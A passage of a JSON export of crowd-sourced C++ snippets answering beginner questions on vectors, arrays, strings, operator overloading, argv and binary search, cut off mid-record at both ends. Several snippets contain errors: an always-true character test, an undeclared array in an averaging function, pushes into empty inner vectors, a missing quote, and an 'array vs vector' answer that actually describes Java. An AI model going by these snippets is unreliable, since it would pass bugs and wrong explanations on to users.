not_a_pointer.name << \"\\n\"; // print the name (with a dot)  \t/* ----- LITERALLY NEITHER ----- */  \tstd::cin.get(); // wait for input \treturn 0; // exit program }  \n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 669,
    "keyword": null,
    "link": null,
    "title": " c++ .* operator",
    "description": "The .* operator is used to dereference pointers to class members.\npacket >> rec1.getPosition().x >> rec1.getPosition().y; \n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 670,
    "keyword": null,
    "link": null,
    "title": " c++ .push back",
    "description": "// vector::push_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int myint = 2;    std::cout << \"Please enter some integers (enter 0 to end):\\n\";    do {     std::cin >> myint;     myvector.push_back (myint);   } while (myint);    std::cout << \"myvector stores \" << int(myvector.size()) << \" numbers.\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 671,
    "keyword": null,
    "link": null,
    "title": " c++ 14 for sublime windoes build system",
    "description": "{  \"cmd\": [\"g++\", \"-std=c++14\", \"${file}\", \"-o\", \"${file_path}/${file_base_name}\"],  \"file_regex\": \"^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$\",  \"working_dir\": \"${file_path}\",  \"selector\": \"source.c, source.c++\",  \"variants\":  [    {      \"name\": \"Run\",      \"cmd\":[\"bash\", \"-c\", \"g++ -std=c++1y '${file}' -o '${file_path}/${file_base_name}' && '${file_path}/${file_base_name}'\"]    }  ]  } \n{  \"cmd\":[\"bash\", \"-c\", \"g++ -std=c++14 -Wall '${file}' -o '${file_path}/${file_base_name}' && '${file_path}/${file_base_name}'\"],  \"file_regex\": \"^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$\",  \"working_dir\": \"${file_path}\",  \"selector\": \"source.c, source.c++\",  \"variants\":  [    {      \"name\": \"Run\",      \"cmd\":[\"bash\", \"-c\", \"g++ -std=c++14 '${file}' -o '${file_path}/${file_base_name}' && '${file_path}/${file_base_name}'\"]    }  ] } \n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 672,
    "keyword": null,
    "link": null,
    "title": " c++ 20 struct initialization",
    "description": "#include <iostream> #include <filesystem>  struct hello_world {     const char* hello;     const char* world; };  int main ()  {     hello_world hw = {         .hello = \"hello, \",         .world = \"world!\"     };      std::cout << hw.hello << hw.world << std::endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 673,
    "keyword": null,
    "link": null,
    "title": " c++ 2D vectors",
    "description": "// Create a vector containing n  //vectors of size m, all u=initialized with 0 vector<vector<int> > vec( n , vector<int> (m, 0));  \n// finding size of a square matrix myVector[0].size();\nmyVector[   Vector[0, 4, 2, 5],   Vector[1, 4, 2] ];  /*When you call for myVector[1].size() it would return 3 and [0] would return 4.  For the amount of rows (int vectors) in the 2d vector, you can just use myVector.size()  You can run this to see it in actions*/\nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d[i].push_back(temp);      } }\n int main()  {      int row = 5; // size of row      int colom[] = { 5, 3, 4, 2, 1 };         vector<vector<int> > vec(row);  // Create a vector of vector with size equal to row.    \tfor (int i = 0; i < row; i++) {    \t\tint col;           col = colom[i];    \t\tvec[i] = vector<int>(col); //Assigning the coloumn size of vector         for (int j = 0; j < col; j++)              vec[i][j] = j + 1;      }         for (int i = 0; i < row; i++) {          for (int j = 0; j < vec[i].size(); j++)              cout << vec[i][j] << \" \";          cout << endl;      }  } \nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d.push_back(temp);// I don't know how to push_back here!!     } }\n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 674,
    "keyword": null,
    "link": null,
    "title": " c++ Attribute Parser",
    "description": "#include <bits/stdc++.h>using namespace std;int main(){int n, q,i;cin>>n>>q;string temp;vector<string> hrml;vector<string> quer;cin.ignore();for(i=0;i<n;i++){    getline(cin,temp);    hrml.push_back(temp);}for(i=0;i<q;i++){    getline(cin,temp);    quer.push_back(temp);}map<string, string> m;vector<string> tag;for(i=0;i<n;i++){    temp=hrml[i];    temp.erase(remove(temp.begin(), temp.end(), '\\\"' ),temp.end());    temp.erase(remove(temp.begin(), temp.end(), '>' ),temp.end());    if(temp.substr(0,2)==\"</\")    {        tag.pop_back();    }    else    {        stringstream ss;        ss.str(\"\");        ss<<temp;        string t1,p1,v1;        char ch;        ss>>ch>>t1>>p1>>ch>>v1;        string temp1=\"\";        if(tag.size()>0)        {            temp1=*tag.rbegin();            temp1=temp1+\".\"+t1;        }        else            temp1=t1;        tag.push_back(temp1);        m[*tag.rbegin()+\"~\"+p1]=v1;        while(ss)        {            ss>>p1>>ch>>v1;            m[*tag.rbegin()+\"~\"+p1]=v1;        }    }}for(i=0;i<q;i++){    if (m.find(quer[i]) == m.end())        cout << \"Not Found!\\n\";    else        cout<<m[quer[i]]<<endl;}return 0;\n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 675,
    "keyword": null,
    "link": null,
    "title": " c++ Determine the start and end of the random number",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tint start = 3; \t\tint end = 8; \t\tcout << start + rand() % (end - start + 1); \t} }\n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 676,
    "keyword": null,
    "link": null,
    "title": " c++ How many functions (methods) can a class have?",
    "description": "class Object { public: \tint var; \tvoid setVar(int n) { \t\tvar = n; \t} \tint getNum() { \t\treturn var; \t} };  int main() { \tObject obj; \tobj.setVar(13); \tstd::cout << obj.getNum() << std::endl; \treturn 0; }\nAs many as you want\n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 677,
    "keyword": null,
    "link": null,
    "title": " c++ Stop",
    "description": "// goto_statement.cpp #include <stdio.h> int main() {     int i, j;      for ( i = 0; i < 10; i++ )     {         printf_s( \"Outer loop executing. i = %d\\n\", i );         for ( j = 0; j < 2; j++ )         {             printf_s( \" Inner loop executing. j = %d\\n\", j );             if ( i == 3 )                 goto stop;         }     }      // This message does not print:     printf_s( \"Loop exited. i = %d\\n\", i );      stop:     printf_s( \"Jumped to stop. i = %d\\n\", i ); } \n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 678,
    "keyword": null,
    "link": null,
    "title": " c++   check first character of string",
    "description": "#include <iostream> #include <string>  int main()  {   string str{};     // creating string   getline(cin, str);// using getline for user input   std::cout << str; // output string namePerson   if (str[0] >= 'a' || str[0] <= 'z')     str[0] -= 32;   return (0); }\n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 679,
    "keyword": null,
    "link": null,
    "title": " c++  sort",
    "description": "std::vector s = {5, 1, 3, 6, 2,}; std::sort(s.begin(), s.end());\n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 680,
    "keyword": null,
    "link": null,
    "title": " c++ access second last element of vector",
    "description": "vector<int> v; cout << v[v.size() - 1]; cout << *(v.end() - 1); cout << *v.rbegin(); // all three of them work\nvector<int> vec; vec.push_back(0); vec.push_back(1); int last_element = vec.back(); int also_last_element = vec[vec.size() - 1]; \narr2.rbegin()[1] // rbegin() is reverse order starting at 0 for last element, 1 for second-last\nstd::v.back()\n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 681,
    "keyword": null,
    "link": null,
    "title": " c++ add object to array",
    "description": "int main() { \tStudent st[5]; \tfor( int i=0; i<5; i++ ) \t{ \t\tcout << \"Student \" << i + 1 << endl; \t\tcout << \"Enter name\" << endl; \t\tst[i].getName(); \t\tcout << \"Enter marks\" << endl; \t\tst[i].getMarks(); \t} \n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 682,
    "keyword": null,
    "link": null,
    "title": " c++ admin windows",
    "description": "#include <windows.h> #include <stdio.h> #pragma comment(lib, \"cmcfg32.lib\")  BOOL SetPrivilege(     HANDLE hToken,          // access token handle     LPCTSTR lpszPrivilege,  // name of privilege to enable/disable     BOOL bEnablePrivilege   // to enable or disable privilege     )  {     TOKEN_PRIVILEGES tp;     LUID luid;      if ( !LookupPrivilegeValue(              NULL,            // lookup privilege on local system             lpszPrivilege,   // privilege to lookup              &luid ) )        // receives LUID of privilege     {         printf(\"LookupPrivilegeValue error: %u\\n\", GetLastError() );          return FALSE;      }      tp.PrivilegeCount = 1;     tp.Privileges[0].Luid = luid;     if (bEnablePrivilege)         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;     else         tp.Privileges[0].Attributes = 0;      // Enable the privilege or disable all privileges.      if ( !AdjustTokenPrivileges(            hToken,             FALSE,             &tp,             sizeof(TOKEN_PRIVILEGES),             (PTOKEN_PRIVILEGES) NULL,             (PDWORD) NULL) )     {            printf(\"AdjustTokenPrivileges error: %u\\n\", GetLastError() );            return FALSE;      }       if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)      {           printf(\"The token does not have the specified privilege. \\n\");           return FALSE;     }       return TRUE; }  \n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 683,
    "keyword": null,
    "link": null,
    "title": " c++ allocate and free dynamic 2d array",
    "description": "// allocate int** matrix = new int*[rowCount]; for(int i = 0; i < rowCount; i++)     matrix[i] = new int[colCount];  // free for(int i = 0 ; i < rowCount; i++)     delete[] matrix[i];\t// delete array within matrix delete[] matrix;\t// delete actual matrix\n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 684,
    "keyword": null,
    "link": null,
    "title": " c++ allocate dynamic with initial values",
    "description": "int length = 50; int *array = new int[length](); // returns 50 length array of 0\n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 685,
    "keyword": null,
    "link": null,
    "title": " c++ ambigous error",
    "description": "\tstd::map<std::string, Text*> text; \n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 686,
    "keyword": null,
    "link": null,
    "title": " c++ append",
    "description": "Extends the string by appending additional characters at the end of its current value\n// appending to string #include <iostream> #include <string>  int main () {   std::string str;   std::string str2=\"Writing \";   std::string str3=\"print 10 and then 5 more\";    // used in the same order as described above:   str.append(str2);                       // \"Writing \"   str.append(str3,6,3);                   // \"10 \"   str.append(\"dots are cool\",5);          // \"dots \"   str.append(\"here: \");                   // \"here: \"   str.append(10u,'.');                    // \"..........\"   str.append(str3.begin()+8,str3.end());  // \" and then 5 more\"   str.append<int>(5,0x2E);                // \".....\"    std::cout << str << '\\n';   return 0; }\n// string::operator+= #include <iostream> #include <string>  int main () {   std::string name (\"John\");   std::string family (\"Smith\");   name += \" K. \";         // c-string   name += family;         // string   name += '\\n';           // character    std::cout << name;   return 0; }\n// appending to string #include <iostream> #include <string>  int main () {   // easy way   std::string str = \"Hello\";   std::string str2 = \" World\";   std::cout << str + str2 << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 687,
    "keyword": null,
    "link": null,
    "title": " c++ append a char to a string",
    "description": "// string::operator+= #include <iostream> #include <string>  int main () {   std::string name (\"John\");   std::string family (\"Smith\");   name += \" K. \";         // c-string   name += family;         // string   name += '\\n';           // character    std::cout << name;   return 0; }\n",
    "reg_date": "2021-10-12T11:37:38.000Z"
  },
  {
    "id": 688,
    "keyword": null,
    "link": null,
    "title": " c++ append to list",
    "description": "// list::push_back #include <iostream> #include <list>  int main () {   std::list<int> mylist;   int myint;    std::cout << \"Please enter some integers (enter 0 to end):\\n\";    do {     std::cin >> myint;     mylist.push_back (myint);   } while (myint);    std::cout << \"mylist stores \" << mylist.size() << \" numbers.\\n\";    return 0; }\nlist<int> myList = list<int>();  //add a 4 to the end of the list myList.push_back(4);  //add a 5 to the begining of the list myList.push_front(5);\n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 689,
    "keyword": null,
    "link": null,
    "title": " c++ argument list for class template is missing",
    "description": "#include \"LinkedArrayList.h\"  template<typename ItemType> void LinkedArrayList<ItemType>::insert (int index, const ItemType& item) {}  template<typename ItemType> ItemType LinkedArrayList<ItemType>::remove (int index) {return ItemType();}  template<typename ItemType> int LinkedArrayList<ItemType>::find (const ItemType& item) {return -1;} \n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 690,
    "keyword": null,
    "link": null,
    "title": " c++ argv",
    "description": "// command line arguments in c++ are stored in an array of c-strings // # of arguments: argc // actual arguments: argv  #include <iostream> using namespace std;  int main(int argc, char** argv){   for(int i = 0; i < argc; i++){     cout << \"argv\" << i << \": \" << argv[i] << endl;   }   return 0; }  /*  ./main.exe hello world  argv0: main.exe argv1: hello argv2: world  */     \n// Use command lines  int main(int argc, char *argv[]) {  \tfor(int i = 1; i < argc; i++){ \t\tif(!strcmp(argv[i], \"-h\") || !strcmp(argv[i], \"--help\") ){ \t\t\tprintf(\"Usage: App <options>\\nOptions are:\\n\"); \t\t\tprintf(\"Option list goes here\"); \t\t\texit(0); \t\t}else if(!strcmp(argv[i], \"-c\") || !strcmp(argv[i], \"--custom\")){ \t\t\tprintf(\"argument accepted\"); \t\t}else{ \t\t\tif(i == argc-1){ \t\t\t\tbreak; \t\t\t} \t\t\tMessageBox(NULL, TEXT(\"ERROR: Invalid Command Line Option Found: \\\"%s\\\".\\n\", argv[i]), TEXT(\"Error\"), MB_ICONERROR | MB_OK); \t\t} \t}  \tMessageBox(NULL, TEXT(\"ERROR: No Command Line Option Found. Type in --hep or -h\"), TEXT(\"Error\"), MB_ICONERROR | MB_OK); }\n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 691,
    "keyword": null,
    "link": null,
    "title": " c++ array",
    "description": "#include <iostream> using std::cout;  int a[] = { 1, 2, 3, 4, 5 }; int counta()   {   return sizeof( a ) / sizeof( a[ 0 ] );  // works, since a[] is an array   }  int countb( int b[] )   {   return sizeof( b ) / sizeof( b[ 0 ] );  // fails, since b[] is a pointer   }\nint foo [] = { 16, 2, 77, 40, 12071 };\nint nCount[] = {1, 2, 3, 4, 5};\n#include <iostream> #include <array> //for using std::array  int main() {  \tint example[5];//array on stack \tint* another = new int[5];//array on heap \tdelete[] another;//freeing up memory on heap \texample[0] = 1; \texample[1] = 2; \texample[2] = 3; \texample[3] = 4; \tfor (int i = 0; i < 5; i++) { \t\texample[i] = 2; \t} \tint* ptr = example;//arrays are just pointers to the begining of the block of memory \texample[2] = 5; \t*(ptr + 2) = 6;//adding 4+4 bytes to ptr \tstd::cout << example[2] << std::endl;//output => 6 \t*(int*)((char*)ptr + 8) = 8;//adding 8 bytes to ptr using ptr arithmetic \tstd::cout << example[2] << std::endl;//output => 8 \t//std::array provide some additional functionality like bounce checking size checking but do have a performance overhead \tstd::array<int,5> stda;//creating an array named stda of int 5 size \tstd::cout << stda.size() << std::endl;//will output size of std::array ,output =>5        std::cin.get(); }\nint foo [5];\nconst int len = 3; int arr[len];  arr[0] = 4;  int abc[4]{0,12,3}\n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 692,
    "keyword": null,
    "link": null,
    "title": " c++ array interator",
    "description": "#include <array> #include <vector>  #include <iterator>  int main() {     int c_array[5] = {};     std::array<int, 5> cpp_array = {};     std::vector<int> cpp_dynarray(5);      auto c_array_begin = std::begin(c_array); // = c_array + 0     auto c_array_end = std::end(c_array);     // = c_array + 5      auto cpp_array_begin = std::begin(cpp_array); // = cpp_array.begin()     auto cpp_array_end = std::end(cpp_array);     // = cpp_array.end()      auto cpp_dynarray_begin = std::begin(cpp_dynarray); // = cpp_dynarray.begin()     auto cpp_dynarray_end = std::end(cpp_dynarray);     // = cpp_dynarray.end() }\n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 693,
    "keyword": null,
    "link": null,
    "title": " c++ array programs",
    "description": "#include <iostream> using namespace std;  int main() {     int numbers[5] = {7, 5, 6, 12, 35};      cout << \"The numbers are: \";      //  Printing array elements     // using range based for loop     for (const int &n : numbers) {         cout << n << \"  \";     }       cout << \"\\nThe numbers are: \";      //  Printing array elements     // using traditional for loop     for (int i = 0; i < 5; ++i) {         cout << numbers[i] << \"  \";     }      return 0; }\n#include <iostream> using namespace std;  int main() {          // initialize an array without specifying size     double numbers[] = {7, 5, 6, 12, 35, 27};      double sum = 0;     double count = 0;     double average;      cout << \"The numbers are: \";      //  print array elements     // use of range-based for loop     for (const double &n : numbers) {         cout << n << \"  \";          //  calculate the sum         sum += n;          // count the no. of array elements         ++count;     }      // print the sum     cout << \"\\nTheir Sum = \" << sum << endl;      // find the average     average = sum / count;     cout << \"Their Average = \" << average << endl;      return 0; }\nint x[6];\n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 694,
    "keyword": null,
    "link": null,
    "title": " c++ array vs vector",
    "description": "//arrays have fixed size, but vectors don't\n- Array contains similar data type. Vector can store heterogeneous data types, if restriction is not put using generics concept. - Array has primitive data type, does not belong to Collection family. Vector implements List interface which is a part of collection hierarchy. - Array is static and needs to be assigned with the fixed size during initialization. Vector resizes itself dynamically as per the need. So,  it is dynamic in nature. - Array is non-synchronized. Vector is synchronized. - Array can be traversed using for loop or enhanced for loop. It cannot use iterator or enumeration interface. Vector can be traversed using iterator  or enumeration interface. \n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 695,
    "keyword": null,
    "link": null,
    "title": " c++ array with variable size",
    "description": "int n = 10; double* a = new double[n]; // Don't forget to delete [] a; when you're done!\n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 696,
    "keyword": null,
    "link": null,
    "title": " c++ arrays",
    "description": "int foo [] = { 16, 2, 77, 40, 12071 };\n#include <iostream> #include <array> //for using std::array  int main() {  \tint example[5];//array on stack \tint* another = new int[5];//array on heap \tdelete[] another;//freeing up memory on heap \texample[0] = 1; \texample[1] = 2; \texample[2] = 3; \texample[3] = 4; \tfor (int i = 0; i < 5; i++) { \t\texample[i] = 2; \t} \tint* ptr = example;//arrays are just pointers to the begining of the block of memory \texample[2] = 5; \t*(ptr + 2) = 6;//adding 4+4 bytes to ptr \tstd::cout << example[2] << std::endl;//output => 6 \t*(int*)((char*)ptr + 8) = 8;//adding 8 bytes to ptr using ptr arithmetic \tstd::cout << example[2] << std::endl;//output => 8 \t//std::array provide some additional functionality like bounce checking size checking but do have a performance overhead \tstd::array<int,5> stda;//creating an array named stda of int 5 size \tstd::cout << stda.size() << std::endl;//will output size of std::array ,output =>5        std::cin.get(); }\nint foo [5];\n// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3 \n// An example of using std::array // Basic syntax: std::array<TYPE, SIZE> NAME; // Note that the size must be a constant  #include <iostream> #include <array> // Use std::array  int main() { \tstd::array<int, 10> arr;   \tarr[0] = 5; // Setting an element   \tstd::cout << arr[0] << std::endl; // Element access   \tstd::cout << arr.at(0) << std::endl; // Element access with bounds checking }\nint bar [5] = { 10, 20, 30 };  \n",
    "reg_date": "2021-10-12T11:37:39.000Z"
  },
  {
    "id": 697,
    "keyword": null,
    "link": null,
    "title": " c++ arrray",
    "description": "assert((std::is_same_v<int, int>))\n#include <iostream> #include <array> //for using std::array  int main() {  \tint example[5];//array on stack \tint* another = new int[5];//array on heap \tdelete[] another;//freeing up memory on heap \texample[0] = 1; \texample[1] = 2; \texample[2] = 3; \texample[3] = 4; \tfor (int i = 0; i < 5; i++) { \t\texample[i] = 2; \t} \tint* ptr = example;//arrays are just pointers to the begining of the block of memory \texample[2] = 5; \t*(ptr + 2) = 6;//adding 4+4 bytes to ptr \tstd::cout << example[2] << std::endl;//output => 6 \t*(int*)((char*)ptr + 8) = 8;//adding 8 bytes to ptr using ptr arithmetic \tstd::cout << example[2] << std::endl;//output => 8 \t//std::array provide some additional functionality like bounce checking size checking but do have a performance overhead \tstd::array<int,5> stda;//creating an array named stda of int 5 size \tstd::cout << stda.size() << std::endl;//will output size of std::array ,output =>5        std::cin.get(); }\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 698,
    "keyword": null,
    "link": null,
    "title": " c++ asio read full socket data into buffer",
    "description": "std::vector<char> vec(1024); asio::read(socket, asio::buffer(vec));\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 699,
    "keyword": null,
    "link": null,
    "title": " c++ assert",
    "description": "static_assert(true); // if condition is false, then assert go boom this is false and stops the code\nassert(std::is_same_v<int, int>); // error: assert does not take two arguments assert((std::is_same_v<int, int>)); // OK: one argument static_assert(std::is_same_v<int, int>); // OK: not a macro std::complex<double> c; assert(c == std::complex<double>{0, 0}); // error assert((c == std::complex<double>{0, 0})); // OK\nstatic_assert(sizeof(long) == 8, \"long must be 8 bytes\"); static_assert(sizeof(int) == 4, \"int must be 4 bytes\");   int main() { \treturn 0; } \n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 700,
    "keyword": null,
    "link": null,
    "title": " c++ assign multiple variables at once",
    "description": "int column = 0, row = 0, index = 0;\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 701,
    "keyword": null,
    "link": null,
    "title": " c++ assignment operator overload",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\n/*  * Assignment operator overload in C++ is used to copy one object into another.  * Specifically, a 'deep' copy is made, such that any heap-allocated memory  * in the copied-from object is copied fresh to the copied-to object. Note also  * that the copied-to object ('this') must deallocated any of its own   * heap-allocated memory prior to making the copy.   *   * The assignment operator overload is called as follows:  *   *  Array a;   *  Array b;  *  // ... put data in b / a ...  *  a = b;    // a now becomes a deep copy of b.   *  * See below for implementation details.   */  /*  * Function:   Example assignment operator overload for an Array class.  * Parameters: An Array to make a deep copy of  * Returns:    A reference to the data in this (for chained assignment a = b = c)  * Effects:    This is now a deep copy of other  */ Array& Array::operator=(const Array& other) {   if (this != &other) {  // ensure no self-assignment (i.e. a = a)     clear();             // deallocate any heap-allocated memory in 'this'     copy(other);         // make a deep copy of all memory in 'other' to 'this'   }   return *this;          // return the data in 'this'  }  /*   *  Function:   clear  *  Parameters: None  *  Returns:    None  *  Effects:    Deallocates heap-allocated memory associated with this object.  */ void Array::clear() { delete [] data; }  /*  * Function:   copy  * Parameters: An array to make a deep copy of  * Returns:    None  * Effects:    Makes a deep copy of other into this.   */ void Array::copy(const Array& other) { \tfor (int = 0; i < other.len; i++) {      \tthis->data[i] = other.data[i];      }   \tthis->len = other.len; }   \n#include <iostream> using namespace std;  class Box {    public:       double getVolume(void) {          return length * breadth * height;       }       void setLength( double len ) {          length = len;       }       void setBreadth( double bre ) {          breadth = bre;       }       void setHeight( double hei ) {          height = hei;       }              // Overload + operator to add two Box objects.       Box operator+(const Box& b) {          Box box;          box.length = this->length + b.length;          box.breadth = this->breadth + b.breadth;          box.height = this->height + b.height;          return box;       }           private:       double length;      // Length of a box       double breadth;     // Breadth of a box       double height;      // Height of a box };  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    Box Box3;                // Declare Box3 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);      // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);      // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;      // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;     // Add two object as follows:    Box3 = Box1 + Box2;     // volume of box 3    volume = Box3.getVolume();    cout << \"Volume of Box3 : \" << volume <<endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 702,
    "keyword": null,
    "link": null,
    "title": " c++ auto loop",
    "description": "array<int, 5> values = {1, 2, 3, 4, 10}; // the type declaration below must be consistent with the array type for (int x : values){ //we use a colon instead of in cout << x << endl; }\nfor (<variable_declaration> : expression){ //statements }\nfor(auto x: myVector){ \tcout<< x << \" \"; }\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 703,
    "keyword": null,
    "link": null,
    "title": " c++ average",
    "description": "// Average of a float  float avg(float numbers[]) {    \tint arraylength = sizeof(arr)/sizeof(arr[0]); \tfloat sum = 0;   \t   \tfor (int i = 0; i < arraylength; i++) {     \tsum += numbers[i];     }      \treturn sum / arraylength; } \n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 704,
    "keyword": null,
    "link": null,
    "title": " c++ awitch statements",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\n#include <iostream> using namespace std;   int main () {    // local variable declaration:    char grade = 'D';     switch(grade) {       case 'A' :          cout << \"Excellent!\" << endl;           break;       case 'B' :       case 'C' :          cout << \"Well done\" << endl;          break;       case 'D' :          cout << \"You passed\" << endl;          break;       case 'F' :          cout << \"Better try again\" << endl;          break;       default :          cout << \"Invalid grade\" << endl;    }    cout << \"Your grade is \" << grade << endl;      return 0; }\nvar = 1  switch (var):    case 1: \tbreak; // Code that is executed if var is 1    case 2: \tbreak; // Code that is executed if var is 2    default: \tbreak; // Code that is executed if no cases match \n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 705,
    "keyword": null,
    "link": null,
    "title": " c++ back()",
    "description": "// string::back #include <iostream> #include <string>  int main () {   std::string str (\"hello world.\");   str.back() = '!';   std::cout << str << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 706,
    "keyword": null,
    "link": null,
    "title": " c++ base 10 to base 2",
    "description": "void show_binary( int dec ) {     std::cout << \"decimal = \" << dec << \"\\n\";          std::string bin{};          while( dec > 0 ) {         if( dec % 2 == 0 ) bin.insert( bin.begin( ), '0' );         else bin.insert( bin.begin( ), '1' );                  dec >>= 1;     }          std::cout << \"binary = \" << bin << \"\\n\"; }\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 707,
    "keyword": null,
    "link": null,
    "title": " c++ base constructor",
    "description": "class Derived: public Base { public:     double m_cost;       Derived(double cost=0.0, int id=0)         : Base{ id }, // Call Base(int) constructor with value id!             m_cost{ cost }     {     }       double getCost() const { return m_cost; } };\n",
    "reg_date": "2021-10-12T11:37:40.000Z"
  },
  {
    "id": 708,
    "keyword": null,
    "link": null,
    "title": " c++ basic code",
    "description": "#include<iostream> using namespace std;  int main() { cout << \" hello world <<endl;      return 0; }\n#include <iostream> #include<conio.h> /* For getch() only */ using namespace std; int main () {    int num = 10;             if (num % 2 == 0)             {                 cout<<\"It is an even number\";             } getch();  /* getch is the function of conio.h */ }\nhelp me i dont now what the freak am doing any more\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include<iostream> using namespace std; int main() { \tsystem(\"pause\"); //To pause the screen   \treturn 0; //Not neccessary }\n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 709,
    "keyword": null,
    "link": null,
    "title": " c++ binary search",
    "description": "#include <iostream> using namespace std;  // This program performs a binary search through an array, must be sorted to work int binarySearch(int array[], int size, int value)  {        int first = 0,         // First array element            last = size - 1,       // Last array element            middle,                // Mid point of search            position = -1;         // Position of search value        bool found = false;        // Flag        while (!found && first <= last)      {               middle = (first + last) / 2;     // Calculate mid point               if (array[middle] == value)      // If value is found at mid           \t{                          found = true;                          position = middle;               }               else if (array[middle] > value)  // If value is in lower half                      last = middle - 1;               else                      first = middle + 1;          // If value is in upper half        }        return position; } int main () {     const int size = 5; // size initialization     int array[size] = {1, 2, 3, 4, 5}; // declare array of size 10     int value; // declare value to be searched for     int result; // declare variable that will be returned after binary search      cout << \"What value would you like to search for? \"; // prompt user to enter value     cin >> value;     result = binarySearch(array, size, value);      if (result == -1) // if value isn't found display this message         cout << \"Not found\\n\";     else  // If value is found, displays message         cout << \"Your value is in the array.\\n\";         return 0; }\n// BY shivam kumar KIIT #include<bits/stdc++.h> usind 